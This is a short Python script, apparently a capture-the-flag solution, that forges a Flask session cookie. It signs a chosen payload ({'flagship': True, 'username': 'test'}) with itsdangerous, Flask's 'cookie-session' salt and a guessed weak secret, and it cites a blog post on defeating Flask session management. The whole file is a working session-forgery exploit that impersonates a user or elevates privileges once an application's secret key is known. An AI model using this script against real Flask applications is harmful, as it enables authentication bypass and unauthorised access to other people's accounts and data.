# craft.py
# Reference: https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

from flask.sessions import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from hashlib import sha1

data = {'flagship': True, 'username': 'test'}
secret = 'password1'

session = URLSafeTimedSerializer(
    secret_key = secret,
    salt = 'cookie-session',
    serializer = TaggedJSONSerializer(),
    signer = TimestampSigner,
    signer_kwargs = {'key_derivation': 'hmac', 'digest_method': sha1}
    ).dumps(data)

print('Session: {}'.format(session))
